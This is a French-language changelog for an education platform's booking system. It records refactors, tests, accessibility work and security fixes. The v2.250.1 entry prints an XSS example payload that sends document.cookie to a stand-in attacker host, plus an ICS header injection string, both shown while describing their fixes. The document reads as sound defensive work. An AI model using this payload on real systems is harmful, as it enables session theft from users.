  `var(--ease-*)`, `--focus-ring`, `--elevation-*`.
- `color-mix(in srgb, var(--accent) X%, transparent)` pour tous les fonds
  doux (callout, stat-card accent, ms-pill ok). Plus aucun rgba/hex
  hardcode dans les nouveaux blocs.
- Reutilisation systematique des composants UI partages :
  `UiPageHeader`, `UiButton`, `SkeletonLoader`, `EmptyState`.

Tests : 1946 passants. Typecheck clean. Lint clean. check:design clean.

## v2.251.3 (2026-04-27)

### Split TabBooking : 673 lignes -> 1 orchestrateur + 3 sections

`TabBooking.vue` etait un monolithe de 673 lignes mixant 3 responsabilites
distinctes. Decoupage en 4 fichiers a responsabilite unique :

- `TabBooking.vue` (151 lignes) : orchestrateur leger. Instancie une seule
  fois `useBooking()`, gere le bandeau Microsoft + listeners socket, et
  delegue le rendu aux 3 sections via prop `booking`.
- `TabBookingEventTypes.vue` (585 lignes) : types de RDV + creation + lien
  public/Jitsi/lien nominatif/bulk + QR codes.
- `TabBookingAvailability.vue` (202 lignes) : grille hebdomadaire des
  disponibilites.
- `TabBookingMyBookings.vue` (164 lignes) : toggle vue calendrier/liste.

**Type partage `BookingHandle`** : nouveau type exporte par `useBooking.ts`
(`ReturnType<typeof useBooking>`) pour typer la prop `booking` sans
redeclarer chaque ref individuellement dans chaque enfant.

**A11y baseline** : `aria-pressed` sur les toggles Active/Public/Jitsi,
`aria-busy` sur le bouton de sauvegarde des disponibilites, paire
`role="tablist"`/`role="tab"` avec `aria-pressed` sur le toggle
calendrier/liste, libelles explicites sur tous les inputs `time` et bouton
supprimer (avec contexte de la valeur supprimee), `type="button"` sur tous
les boutons hors form.

**Tokens design system** :

- Tous les `var(--space-*)`, `var(--radius-*)`, `var(--motion-*)`,
  `var(--ease-*)`, `var(--focus-ring)` au lieu des valeurs hardcodees.
- Badges status (success/warning/danger) passent sur `color-mix(in srgb,
  var(--color-*) X%, transparent)` au lieu des hex.
- Palette d'identification des types (12 couleurs) explicitement marquee
  comme palette fixe (pas des tokens theme), commentee comme telle.
- Microsoft status dot : passe de `#22c55e` / `#94a3b8` vers
  `var(--color-success)` / `var(--text-muted)`.

Tests : 1946 passants (aucun nouveau, aucune regression). Typecheck clean.
Lint clean. check:design clean.

## v2.251.2 (2026-04-27)

### Tests useBooking + extraction helpers BookingFlow + a11y baseline

**Tests `useBooking.ts`** (35 tests, etait 0) :

- `fetchAll` (parallele, erreur reseau, ok=false par appel)
- `sortedBookings` (tri sans mutation), `rulesByDay` (groupage)
- `createEventType` (ok / erreur backend / exception)
- `toggleActive` (flip + patch local optimiste)
- `togglePublic` : cas critique du slug allonge cote backend (anti-enumeration), cas no-data fallback patch local, toast "active" vs "desactive"
- `toggleJitsi`, `getPublicUrl`, `deleteEventType` (avec confirm() = false / true / erreur)
- `generateLink`, `generateBulkLinks` (ratio dans le toast)
- `addSlot` (validation horaires invalides, id negatif), `removeSlot` (par reference)
- `saveAvailability` (serialisation sans id, refetch, reset savingAvailability sur exception)
- Socket listeners : `initSocketListeners` souscrit, `onBookingNew` toast + refetch, `disposeSocketListeners` idempotent
- `statusLabel`, `statusClass` (mapping + fallback)

**Extraction helpers purs** (`utils/bookingHelpers.ts` + 13 tests) :

- `toIso`, `fmtDateLong`, `fmtTime`, `detectUserTimezone`, `bookingErrorTitle`, `DAY_INITIALS_FR`.
- Auparavant inlines dans `BookingFlow.vue` (donc impossibles a tester directement). BookingFlow passe sur ces imports.
- Mutualisation : `useBooking` reutilise `SERVER_URL` depuis `useBookingApi` (etait redeclare).

**A11y baseline `BookingFlow.vue`** :

- `role="alert"` + `aria-live="assertive"` sur l'etat erreur, `role="status"` + `aria-live="polite"` sur loading et confirmation.
- `aria-label` sur les jours du calendrier ("lundi 27 avril 2026 (creneaux disponibles)") et `aria-pressed` sur le jour selectionne.
- `aria-label` sur les boutons de creneau ("Reserver 14:00").
- `aria-required="true"` sur les inputs requis du formulaire.
- `aria-busy` sur le bouton de soumission pendant la requete.
- `role="alert"` + `aria-live="polite"` sur les messages d'erreur captcha et backend.
- `aria-hidden="true"` sur les icones decoratives.
- `type="button"` explicite sur tous les boutons hors form (evite les submit non voulus).
- `novalidate` sur le form (validation custom via canSubmit).

Tests : 1946 passants (48 nouveaux). Typecheck clean. Lint clean.

## v2.251.1 (2026-04-27)

### Refacto booking : DRY composables + extraction BookingShell

Suite a l'audit du systeme de booking, extraction des duplications haute valeur :

**Nouveau composable `useBookingApi.ts`** (40 lignes) :

- Mutualise le wrapper `fetchWithTimeout` + parsing JSON + mapping AbortError/network qui etait duplique a l'identique entre `usePublicBooking` (wrapper `apiFetch`, 12 lignes) et `useCampaignBooking` (wrapper `api`, 12 lignes).
- Centralise la resolution `SERVER_URL` via env (etait redeclare dans les 2 fichiers).
- Expose `buildIcsUrl(basePath, bookingId)` reutilise par `usePublicBooking.icsUrl()`.
- Type `ApiResult<T>` partage : enveloppe `{ ok, data, error, code }`.

`usePublicBooking.ts` passe de 169 -> 144 lignes ; `useCampaignBooking.ts` passe de 136 -> 110 lignes. Total : ~50 lignes de duplication eliminees, signatures inchangees pour les callers.

**Nouveau composant `BookingShell.vue`** (30 lignes) :

- Coque visuelle (background, centrage, padding responsive, dark mode via `prefers-color-scheme`) qui etait dupliquee mot pour mot dans les 3 wrappers `BookingPublicView`, `BookingPublicEventView`, `BookingCampaignView`.
- Les 3 vues passent en wrappers minimaux (~10 lignes chacune au lieu de 30).

**Nouveaux tests (32)** :

- `useBookingApi.test.ts` : 10 tests sur le wrapper (success, ok=false, AbortError, TimeoutError, erreurs reseau, prefixage SERVER_URL, opts.method/headers, buildIcsUrl token+event).
- `usePublicBooking.test.ts` : 22 tests sur le composable public (modes token/event, encodage de l'identifiant, fetchEventInfo + erreurs, fetchSlotsRange parallele + dedup + tri, selectSlot/back, bookSlot avec contrats de payload differents par mode, icsUrl token vs event).

Tests : 1898 passants (32 nouveaux). Typecheck clean. Lint clean.

## v2.251.0 (2026-04-27)

### Tests booking + retrait Teams + refonte UX CampaignManager

**Tests booking & campagnes (72 nouveaux tests)** :

- `bookingFlow.test.ts` : 32 tests sur la logique pure de BookingFlow.vue (toIso, buildMonthGrid, slotsByDate, canSubmit, errorTitle, canGoPrev, auto-selection 1ere date dispo, pre-remplissage formulaire).
- `useCampaigns.test.ts` : 22 tests sur le composable de gestion des campagnes (CRUD, cycle de vie draft/active/closed, filtres calcules, refetch, toasts).
- `useCampaignBooking.test.ts` : 18 tests sur le composable etudiant (fetchInfo + booking existant, fetchSlots, selectSlot/back, payload tripartite, error mapping, AbortError).

**Retrait Teams de l'UI** :

- AgendaView : suppression du checkbox "Creer une reunion Teams + Outlook", du bouton "Rejoindre Teams" dans le panneau detail, du compteur Teams dans le hero jour/semaine, de l'entree Teams du context menu, des classes CSS `.ag-btn--teams`/`.ag-check-label`.
- SettingsIntegrations : carte renommee "Microsoft Outlook", description recentree sur la sync calendrier.
- TabBooking : retrait de la mention "Prend le pas sur Microsoft Teams meme si connecte".
- WidgetAgendaJour : retrait du bouton "Rejoindre Teams".
- WidgetQuickLinks : retrait du lien Teams par defaut.

L'integration Microsoft 365 OAuth reste en place pour la sync Outlook (sans creation de reunion Teams).

**Refonte UX/UI CampaignManager** :

- Passe entierement sur les composants UI partages : `UiCard` (avec `accentColor`), `UiPill` (tones semantiques), `UiButton` (avec loading), `EmptyState`, `Modal`, `useConfirm`.
- Tokens design respectes : `var(--space-*)`, `var(--radius-*)`, `var(--motion-*)`, `var(--ease-*)`. Plus aucun hex hardcode (passage a `color-mix(in srgb, var(--color-*) X%, transparent)`).
- Bandeau stats en haut (brouillons / actives / cloturees / ratio reservations).
- Palette couleurs restreinte (6 swatches brand) au lieu d'un picker hex libre.
- Selecteur jours en chip-toggle (style Calendly) au lieu d'un `<select>`.
- Toggle cards illustrees pour Tripartite et Jitsi avec description inline.
- Skeleton shimmer pendant le chargement.
- EmptyState avec CTA "Creer ma premiere campagne".
- Meta-chips par campagne (duree, tripartite, Jitsi auto, jours exclus).
- Progress bar semantique (muted < 25% → warning < 75% → success).
- Validation footer qui nomme les champs manquants.
- a11y : `role="radiogroup"`, `aria-checked`, `aria-expanded/controls`, `aria-labels`, `--focus-ring` partout.
- Confirmations unifiees via `useConfirm` (variant info/warning/danger).

Tests : 1866 passants (40 nouveaux campagnes + 32 nouveaux BookingFlow). Typecheck clean. Lint clean. check:design clean sur les fichiers modifies.

## v2.250.4 (2026-04-27)

### Fix : `window.api.onBookingNew is not a function` en mode web

Symptome : sur le build web (cursus.school via navigateur), plein d'onglets (Documents, Rendez-vous, etc.) plantaient avec `window.api.onBookingNew is not a function` ou variantes (`onBookingCancelled`, `onAuthExpired`, `onStatusChange`, `onPollUpdate`, `onLiveCodeUpdate`, ...). Cause : le shim `src/web/api-shim.ts` n'expose qu'un sous-ensemble du preload Electron. A chaque feature ajoutee au preload sans toucher au shim, le mode web casse.

**Fix immediat — handlers manquants** :

Ajout explicite dans le shim de `onBookingNew`, `onBookingCancelled` et `onAuthExpired`, plus le wiring socket `booking:new` / `booking:cancelled`.

**Fix structurel — Proxy fallback** :

`window.api` est maintenant wrappe dans un `Proxy` qui intercepte les proprietes inconnues et retourne un fallback degrade :

- `on*` / `off*` -> retourne un unsubscribe no-op `() => {}`
- `emit*` / `set*` / `clear*` -> retourne `undefined`
- Methodes async -> `Promise.resolve({ ok: false, error: 'Action non disponible sur le web', _webFallback: true })`

Chaque methode unknown est loggee une seule fois en console (`[api-shim] window.api.xxx() not implemented`) pour faciliter le debug ulterieur sans bruit. L'app continue a marcher gracefully au lieu de crasher.

**Compromis** : ce filet masque potentiellement de vraies regressions (une route renommee qui devrait fonctionner en web). Acceptable car le mode web reste secondaire et le warning console pointe immediatement vers la cause.

Tests : 42 passants (8 booking + 34 app store). Typecheck clean.

## v2.250.3 (2026-04-27)

### Fix : creation de campagne (suspect zod refine + log diagnostique)

Apres le durcissement v2.250.1, des utilisateurs voient "Erreur a la creation" au POST /api/bookings/campaigns. Sans access aux logs prod, fix preventif + amelioration du log pour un futur diagnostic.

**Fix probable** : le `refine()` zod ajoute sur `fallbackVisioUrl` interagissait possiblement mal avec `.optional().nullable()` en zod v4 quand le champ etait absent. Remplace par un `z.preprocess()` qui convertit `null` / `""` / `undefined` en `undefined` AVANT la chaine de validation. Applique aux 2 endroits (`teacherAdmin.js` et `campaigns.js`).

**Log diagnostique** : le handler POST `/campaigns` enveloppe la creation dans un try/catch qui logue `error`, `stack`, `payloadKeys` cote serveur. Le wrap masque le detail au client (anti-leak), mais on garde la trace serveur pour debug ulterieur.

## v2.250.2 (2026-04-27)

### Fix : bandeau "session expirée" qui reste collé après reconnexion

Symptome : un utilisateur recoit un 401 sur une requete (token JWT temporairement expire, race au demarrage), le bandeau rouge `Votre session a expire. Veuillez vous reconnecter.` s'affiche, `logout()` est appele, l'utilisateur se reconnecte (manuellement ou via `restoreSession` au reload). Mais `sessionExpiredMessage` n'etait jamais reset -> bandeau persistant alors que l'app marche.

**Fix** :

- `login()` et `restoreSession()` reset `sessionExpiredMessage.value = ''`. Une nouvelle session = pas de bandeau herite.
- Bouton de fermeture (×) sur le bandeau via `dismissSessionExpired()` expose par le store. L'utilisateur peut le fermer si la condition de declenchement persiste (ex: 401 sur une route polling en arriere-plan).
- Reorganisation : `sessionExpiredMessage` declare en haut du store (avec les autres refs d'etat) au lieu d'etre cache dans `initAuthExpiredListener`. Plus simple a auditer.

Tests : 34 tests app store passent. Typecheck propre.

## v2.250.1 (2026-04-27)

### Booking : durcissement post-audit (1 BLOQUANT + 5 IMPORTANT + 2 NICE)

Audit refacto + securite sur la stack booking v2.245-v2.250. Synthese des fixes :

**BLOQUANT — XSS via `joinUrl` dans tous les mails (B1)** :

- `<a href="${joinUrl}">` injecte la valeur sans whitelist de scheme ni escape attribut. Un prof posait `fallbackVisioUrl: "javascript:fetch('https://attacker/?c='+document.cookie)"` -> le mail HTML execute le payload chez l'etudiant + tuteur + co-prof a chaque clic.
- Fix : nouveau helper `safeHttpUrl(u)` (whitelist `^https?://`, parse via `URL`) dans `server/utils/escHtml.js`. Applique aux 5 templates (`sendBookingConfirmation`, `sendBookingCancellation`, `sendBookingReminder`, `sendBookingReschedule`, `sendCampaignInvite`, `sendTripartiteConfirmation`). Plus tous les `href` passent par `escHtml(safeHttpUrl(...))`.
- Defense en profondeur cote zod : `fallbackVisioUrl` dans `teacherAdmin.js` et `campaigns.js` refuse maintenant explicitement les schemes non-http(s) via `.refine()`.

**IMPORTANT** :

- **I2 — DELETE campagne avec bookings** : la suppression effacait l'event_type "fantome" qui faisait disparaitre les bookings historiques en cascade. Nouveau guard `countCampaignBookings()` rejette le DELETE si > 0 reservations confirmees, message clair "Cloture-la plutot".
- **I3 — captcha fail-open silencieux** : si `TURNSTILE_SECRET_KEY` disparait en prod (rotation rate, redeploy partiel), le captcha desactivait sans alerte. Ajout d'un `log.warn` au boot quand `NODE_ENV=production` et la var est manquante.
- **I5 — race condition double-launch** : double-clic sur "Lancer" envoyait potentiellement 2x les mails. Nouveau helper `transitionCampaignStatus(id, fromStatus, toStatus)` qui fait un `UPDATE ... WHERE id=? AND status=?` atomique ; si `changes() === 0`, on rejette avec 400.
- **I6 — slug enumerable si user-choisi long** : `ensurePublicSlug` n'allongeait que si `< 10 chars`. Un prof avec slug `cesi-rohan-2026` (15 chars) restait devinable. Le helper genere maintenant SYSTEMATIQUEMENT un suffixe `-XXXXX` (5 chars hex) sauf si le slug en porte deja un (idempotence).

**NICE-TO-HAVE** :

- **N2 — `escIcs` ne strippait pas `\r`** : un attendee `name = "X\rNEWHEADER:foo"` injectait une nouvelle property ICS. Regex etendue a `/\r\n|\r|\n/g`.

**Refactoring (impact propre)** :

- Code mort retire : `slotsByDate`, `weekStart` (refs/computed) dans `usePublicBooking.ts`, `slotsByDate`, `sortedDates` dans `useCampaignBooking.ts`. La refonte `BookingFlow.vue` recalcule son propre groupement, ces exports etaient orphelins.
- `fetchSlots(weekOffset)` (single-week) supprime de `usePublicBooking` au profit du `fetchSlotsRange(8)` deja en place.

**Tests** : 21/21 booking tests passent. Typecheck clean.

**Non traite dans ce patch** (a planifier) :

- Refactoring du service `bookingService.confirmBooking` pour mutualiser les 3 handlers POST `/book` qui dupliquent ~250 lignes (visio + ICS + email + reminder + socket). Effort 1/2 journee, faut une suite de tests d'integration d'abord.
- Renommage `bookings.teams_join_url` -> `bookings.visio_join_url` (la colonne contient deja du Jitsi). Migration + 9 callsites.
- Couverture tests campaigns/campaignPublic/jitsi (zero test sur ces routes nouvelles).

## v2.250.0 (2026-04-27)

### Booking : refonte UX/UI des pages publiques (style Calendly)

Les 3 pages publiques de reservation (`/book/:token`, `/book/e/:slug`, `/book/c/:token`) partagent maintenant un seul composant `BookingFlow.vue` avec un layout type Calendly :

- **Layout 2 colonnes** desktop (320px / flex). Gauche : recap permanent (host, titre, duree, visio, fuseau, description). Droite : selection ou formulaire. Sur mobile, passage en 1 colonne.
- **Calendrier mensuel** au lieu d'une grille semaine. Navigation prev/next (sans retour avant le mois courant). Les jours avec creneaux sont colores et cliquables ; les autres sont grises et bloques. Date selectionnee mise en evidence en aplat accent.
- **Slots verticaux** a droite du calendrier, scroll si liste longue, selection en 1 clic.
- **Etape details epuree** : recap RDV en colonne gauche avec bouton "Modifier le RDV" qui retourne au calendrier ; formulaire reduit avec champs nom/email pre-remplis et grise quand l'utilisateur est deja identifie (mode token et campagne). Le formulaire s'adapte au tripartite (separateur "Tuteur entreprise" + 2 champs additionnels).
- **Confirmation centree pleine largeur** : icone success, recap card, boutons "Rejoindre la visio" + "Ajouter au calendrier" (ICS).
- **Captcha Cloudflare Turnstile** (mode event uniquement) integre proprement dans l'etape details, reset automatique apres erreur backend.
- **Fuseau horaire** : detecte automatiquement via `Intl.DateTimeFormat()` et affiche dans le recap + la confirmation.

**Refactoring** :

- Nouveau composant `BookingFlow.vue` qui encapsule toute la logique d'affichage (calendrier mensuel, slots, formulaire, captcha, confirmation).
- Types partages dans `bookingFlow.types.ts` (BookingFlowInfo, BookingFlowResult, BookingFlowSubmitPayload).
- `BookingPage.vue` et `BookingCampaignView.vue` deviennent de simples wrappers qui plug leur composable (`usePublicBooking`, `useCampaignBooking`) sur le flow.
- Nouveau helper `fetchSlotsRange(weeks)` dans `usePublicBooking` qui charge 8 semaines en parallele a l'arrivee. Le calendrier mensuel a directement tous les slots du mois courant + suivant sans pagination.

**Impact code** :

- Suppression d'environ 700 lignes de markup/style dupliquees entre les 3 vues.
- Aucun changement backend ni de schema, uniquement frontend.
- Comportements existants preserves : token nominatif, lien public ouvert avec captcha, campagne tripartite avec ICS.

## v2.249.0 (2026-04-27)

### Booking : Campagnes de RDV (visites tripartites planifiees)

Nouveau primitif "Campagne" : un prof cree une periode bornee (ex: 5-26 mai), definit ses plages hebdo (Mar/Jeu 14h-17h), choisit une promo cible. Cursus pre-genere une invitation par etudiant et envoie un mail au lancement. Chaque etudiant reserve son creneau via un lien personnel `/book/c/:token`. Mail de confirmation tripartite (etudiant + tuteur entreprise + prof) avec ICS attache (METHOD:REQUEST) compatible Outlook/Gmail/Apple sans dependre d'OAuth Microsoft.

**Workflow prof, en clics minimaux** :

1. Onglet Rendez-vous -> bouton "Nouvelle campagne"
2. Formulaire : titre + promo + duree + periode (J0 a J0+21 par defaut) + 1 plage hebdo + tripartite + email de notif. Pre-rempli intelligemment (3 prochaines semaines, mardi 14-17h).
3. "Creer" -> Cursus genere automatiquement les invitations pour la promo.
4. "Lancer (N mails)" -> envoi en lot. Statut passe en `active`.
5. Tableau de suivi : "12/24 reserve" + barre de progression + bouton "Relancer les non-reserves".

**Workflow etudiant** :

1. Mail recu avec lien personnel (`/book/c/:token`).
2. Page le reconnait par son token : nom + email pre-remplis, pas de saisie.
3. 1 clic sur un creneau dispo.
4. Si tripartite : saisit nom + email tuteur entreprise.
5. Confirmation -> mail tripartite avec invitation calendrier .ics.

**Backend** :

- Migration v85 : tables `booking_campaigns` + `booking_campaign_invites`. Campagne = event_type "fantome" auto-cree (slug `__campaign_*`, filtre des listes publiques) + periode + regles JSON.
- Routes admin : CRUD + `launch` + `remind` (relance les pending uniquement) + `close`.
- Routes publiques : `/api/bookings/public/campaign/:token/(info|slots|book)`. Le token resoud le student, pas de saisie redondante.
- Email `sendCampaignInvite` (lien personnel) et `sendTripartiteConfirmation` (3 destinataires + ICS attache).
- ICS etendu : support `attendees`, `METHOD:REQUEST`, `organizer`, UID stable -> Outlook propose Accepter/Refuser sur l'invitation.
- Reutilise `generateSlots` existant en passant `daysCount` = duree de la campagne ; ne re-implemente rien.
- Visio : Jitsi Meet par defaut (chaque RDV = lien unique non devinable).

**Frontend** :

- `useCampaigns` (CRUD + launch/remind/close) et `useCampaignBooking` (page publique etudiant).
- `CampaignManager.vue` : section dans onglet Rendez-vous, expand/collapse par campagne, modal de creation, tableau de suivi avec compteurs et statuts par etudiant.
- `BookingCampaignView.vue` : page `/book/c/:token` avec creneaux groupes par jour, formulaire tuteur si tripartite, ecran de confirmation.

**Tests** :

- 1600 tests backend passent (incluant la suite booking complete).
- 1794 tests frontend passent (les unhandled exceptions canvas-confetti dans les tests `useStudentDeposit*` sont resolues via mock dans `tests/frontend/setup.ts`).

## v2.248.0 (2026-04-27)

### Booking : Jitsi Meet en alternative libre a Teams

Avant : la visio etait soit Microsoft Teams (necessite tenant Azure AD + licence M365 Business), soit une URL fallback statique manuelle. Pas d'option libre out-of-the-box.

Maintenant : nouveau flag `use_jitsi` sur `booking_event_types`. Quand actif, Cursus genere automatiquement un lien Jitsi Meet unique (slug aleatoire 16 chars hex, 64 bits d'entropie) a chaque reservation. Prend le pas sur Teams meme si Microsoft est connecte cote prof.

**Pourquoi Jitsi** :

- Libre (Apache 2.0), gratuit, pas de compte requis cote etudiant.
- API Graph Teams `OnlineMeetings.ReadWrite` n'est pas accessible aux comptes Microsoft personnels (Outlook.com gratuit) — Jitsi resout cette friction pour les profs sans tenant pro.
- Self-hostable plus tard sans toucher au code applicatif (var d'env `JITSI_BASE_URL`).

**Backend** :

- Migration v84 : `booking_event_types.use_jitsi INTEGER NOT NULL DEFAULT 0`.
- Helper `server/utils/jitsi.js` : `generateJitsiUrl()` genere `<JITSI_BASE_URL>/cursus-<random16hex>`. Default `https://meet.jit.si`.
- `publicBooking.js` : nouvelle priorite visio (Jitsi > Teams > fallback URL) sur les 2 routes de reservation (token nominatif + lien public).
- L'URL Jitsi est stockee dans `bookings.teams_join_url` (champ deja utilise pour Teams) — pas de migration de schema cote bookings.
- Le lien Jitsi est inclus dans l'email de confirmation et l'evenement ICS, comme avant pour Teams.

**Frontend** :

- `useBooking.ts` : helper `toggleJitsi(et)` avec toast informatif.
- `TabBooking.vue` : toggle "Visio Jitsi Meet" dans le bloc deplie de chaque type d'evenement, au-dessus du toggle "Lien public ouvert".
- `EventType` interface ajoute `use_jitsi: number`.

**Cas d'usage typique** :

Prof sans compte Azure AD pro -> active `use_jitsi` sur ses types d'evenements -> chaque etudiant qui prend RDV recoit un lien Jitsi unique dans son mail de confirmation. Aucun setup Microsoft requis. La visio fonctionne dans Chrome/Firefox/Safari sans installation.

## v2.247.0 (2026-04-27)

### Booking : Cloudflare Turnstile sur le lien public

Cloture le BLOQUANT identifie par l'audit securite v2.245 ("Cursus utilisable comme relais email/spam"). On ajoute un captcha invisible Cloudflare Turnstile sur la route `POST /api/bookings/public/event/:slug/book`.

Pourquoi Turnstile et pas hCaptcha / reCAPTCHA :

- Gratuit sans plafond, pas de tracker tiers, RGPD-friendly.
- Invisible la plupart du temps (cookie navigateur, telemetrie passive). Une vraie personne ne voit jamais de challenge.
- Pas de dependance npm cote backend ni frontend (script charge a la demande, API HTTP simple).

**Backend** :

- Helper `verifyTurnstile(token, ip)` dans `publicBooking.js` : appelle `https://challenges.cloudflare.com/turnstile/v0/siteverify` avec timeout 5s.
- "Fail closed" : si l'API Turnstile est injoignable, on refuse la reservation (sinon un attaquant pourrait bypass en sabotant la connexion sortante).
- Activation conditionnelle : si `TURNSTILE_SECRET_KEY` n'est pas dans l'env, le check est skippe (mode dev / tests).
- Schema zod `publicBookSchema` etend avec `captchaToken: z.string().optional()`. Reponse 400 + `code: 'captcha_failed'` en cas d'echec.

**Frontend** :

- `BookingPage.vue` charge `https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit` a la demande quand on entre dans l'etape "details", uniquement en mode `event` (lien public ouvert) et uniquement si `VITE_TURNSTILE_SITE_KEY` est definie au build.
- Bouton "Confirmer le rendez-vous" disabled tant que le widget n'a pas emis son token.
- Le widget est reset apres un echec backend pour forcer une nouvelle verification.
- Cleanup automatique a `onBeforeUnmount` (pas de leak DOM).

**Configuration** :

Documentee dans `server/.env.example`. Obtenir une paire site-key / secret-key gratuitement sur `dash.cloudflare.com` -> Turnstile. La site-key est exposee dans le bundle (publique), la secret-key reste cote serveur.

**Effet sur l'attaque "relay email"** :

L'attaquant doit desormais resoudre un challenge Turnstile par reservation. Cloudflare bloque les UA scrapers, les datacenter IPs et les sessions sans empreinte navigateur coherente. Le cout passe d'un POST gratuit a une charge non triviale (orchestration headless + rotation residentielle), suffisant pour decourager le scenario decrit dans l'audit.

## v2.246.0 (2026-04-27)

### Booking : durcissement du lien public (post-audit)

Audit securite + UX du mode "lien public ouvert" introduit en v2.245. 3 categories de fixes.

**Anti-spoofing (subject Outlook + body)** :

- Nouveau helper `sanitizePlainText()` dans `server/utils/escHtml.js` : strippe CR/LF/TAB (injection d'en-tetes RFC5322), caracteres de controle ASCII, zero-width (U+200B..U+200F), marques bidi (U+202A..U+202E, U+2066..U+2069) et BOM (U+FEFF).
- `attendeeName` (lien public) et `tutorName` (lien token nominatif) passes par `sanitizePlainText` des l'entree, refus avec 400 si le nom devient vide apres sanitize.
- Subject Outlook utilise desormais `sanitizePlainText` au lieu de `escHtml` (le subject n'est pas du HTML : `escHtml` introduisait `&amp;` litteraux dans les noms et n'eliminait pas les CR/LF).

**Anti-enumeration de slug** :

- Activation de `is_public` cote backend : si le slug courant est inferieur a 10 caracteres, il est automatiquement allonge avec un suffixe hex de 5 caracteres (ex: `jean` -> `jean-a3f2c`). Empeche l'enumeration par dictionnaire de prenoms / noms courts.
- Le toast cote prof annonce explicitement le nouveau slug (`Lien public active. Slug allonge en "jean-a3f2c" pour la securite.`).
- `slug` ajoute a la liste blanche du `updateEventType` model.

**UX page etudiant** :

- Placeholder email passe de `email@entreprise.com` a `prenom.nom@exemple.fr` en mode public ouvert (la page n'est plus exclusivement pour les tuteurs entreprise).
- Inputs nom + email avec `autocomplete="name"` / `autocomplete="email"` et `id`/`for` corrects pour autofill mobile + a11y.
- Backend distingue 4 codes d'erreur (`invalid_link`, `not_found`, `closed`, `inactive`) au lieu d'un message generique. La page etudiant affiche un titre et un sous-texte adaptes (ex: "Reservations fermees" + "Si tu attendais une reponse de cet enseignant, contacte-le directement").

**Reste BLOQUANT non resolu** : pas de CAPTCHA. Cursus reste theoriquement utilisable comme relais email (envoi de mails de confirmation a des tiers via slug devine + email arbitraire). Mitigation operationnelle pour l'instant : limites de rate (20 req/min/IP, 30 req/min/slug) + slug allonge. CAPTCHA / hCaptcha a ajouter en v2.247 si signal d'abus detecte.

## v2.245.0 (2026-04-27)

### Booking : lien public ouvert (Calendly classique)

Avant : chaque RDV necessitait un token nominatif genere pour un etudiant precis (lien personnel a chaque destinataire).
Maintenant : un type d'evenement peut etre marque `is_public` pour exposer une page publique unique a partager a tout le monde, sans inscription Cursus.

**Backend** :

- Migration v83 : `booking_event_types.is_public INTEGER NOT NULL DEFAULT 0`.
- Nouveau modele `getPublicEventTypeBySlug(slug)` (refuse si `is_active = 0` ou `is_public = 0`).
- Routes publiques `GET /api/bookings/public/event/:slug`, `GET /event/:slug/slots`, `POST /event/:slug/book` et `GET /event/:slug/booking/:id/ics`.
- Reservation publique = `student_id = 0` (sentinelle, pas de FK), seuls `tutor_name` / `tutor_email` portent les coordonnees du visiteur.
- Rate limiter dedie par slug (`30 req/min/slug`) en plus du limiter IP (`20 req/min/IP`).
- Integration Microsoft inchangee : creation Teams + Outlook + email de confirmation se declenche quand le prof a connecte son compte.
- `getBookingByCancelToken` en LEFT JOIN sur `students` pour supporter les RDV publics ; `cancellation` redirige le rebookUrl vers `/book/e/:slug` au lieu de regenerer un token nominatif.
- Route admin `GET /api/bookings/event-types/:id/public-link` pour previewer l'URL avant activation.

**Frontend** :

- Composable `usePublicBooking(identifier, mode)` : `mode = 'token'` (lien nominatif, defaut) ou `'event'` (lien public ouvert).
- Vue `BookingPublicEventView.vue` montee sur la route hash `/book/e/:slug`.
- `TabBooking.vue` : nouvelle section "Lien public ouvert" dans le bloc deplie de chaque type d'evenement, avec toggle on/off, URL, bouton "Copier" et QR code.
- Helpers `togglePublic(et)` et `getPublicUrl(et)` exposes par `useBooking`.

## v2.202.0 (2026-04-20)

### Drag-drop : composable modernise + composant unifie

Amelioration du design du composable `useSimpleFileDrop` et extraction d'un composant `<FileDropZone>` pret a l'emploi.

**Composable `useSimpleFileDrop` v2** :

- **Drag counter** interne : plus de flicker `isDragOver` quand la souris passe sur les enfants de la zone (bug classique du `dragenter`/`dragleave` qui se declenchent pour chaque descendant).
- **Machine a etats** : `status = 'idle' | 'drag-over' | 'processing' | 'success' | 'error'`. Les consumers peuvent peindre une animation differente par etat.
- **Auto-reset** apres succes/erreur (`successResetMs`, defaut 1.5s) pour animer un flash "depot recu" sans boilerplate.
- **Bindings object** : `v-bind="drop.bindings"` remplace le cablage des 4 handlers. API plus courte.
- **Disabled reactif** : passe un `Ref<boolean>` / `ComputedRef<boolean>` pour bloquer dynamiquement (ex: tant que le promoId n'est pas choisi).
- **`requireElectronPath`** : option pour rejeter les drops web quand l'app a besoin d'un path filesystem.
- **Handlers async + gestion d'erreur** : si le `onDrop` throw, status passe a 'error' + toast. Plus silencieux.
- **API legacy preservee** : `isDragOver`, `onDragEnter/Over/Leave`, `onDrop` restent exposes, aucun breaking change pour les consumers v2.201.

**Composant `<FileDropZone>`** (`@/components/ui/FileDropZone.vue`) :

- Zone de drop pre-stylee, accessible (role button, keyboard Enter/Space, aria-busy).
- Props : `accept`, `allowedExtensions`, `maxBytes`, `multiple`, `disabled`, `label`, `hint`, `dragOverLabel`, `processingLabel`, `successLabel`, `variant` (`default` | `compact`), `requireElectronPath`.
- Icones automatiques par status (Upload / Loader2 / CheckCircle2 / AlertCircle).
- Animations : halo + scale en drag-over, flash en success, shake en error. `prefers-reduced-motion` respecte.
- Slot `#icon` pour override.
- ImportStudentsModal migre comme demo (supprime ~30 lignes de CSS + markup inline).

## v2.201.0 (2026-04-20)

### Drag-and-drop partout + composable moderne

Audit UX/UI : apres le drag-drop du depot etudiant (v2.200), scan complet des surfaces d'upload (etudiant + prof) pour combler les trous. Extraction d'un composable centralise et modernise.

**Composable `useSimpleFileDrop`** modernise :

- API unifiee a base d'array `FileDropItem[]` (single ou multi-file).
- Chaque item expose `path` (Electron), `file` (objet File brut pour FileReader / FormData), `name`, `size`, `type` (MIME).
- Validation declarative : `maxBytes`, `allowedExtensions`, `accept` MIME pattern (`'image/*'`, `'application/pdf'`, etc.).
- Support `multiple: true` pour le multi-file.
- Fallback propre si `file.path` Electron indispo (toast d'erreur clair).

**Surfaces equipees** :

- **`RessourcesModal`** (prof ajoute ressource a un travail) : zone cliquable + drop. Pre-remplit le nom si vide.
- **`ImportStudentsModal`** mode CSV : zone drop visible dans le body + validation extension `.csv`/`.txt`. Skip le dialog natif.
- **Preload `importStudents(promoId, path?)`** : accepte path optionnel pour drag-drop, backward-compat avec les callers existants.
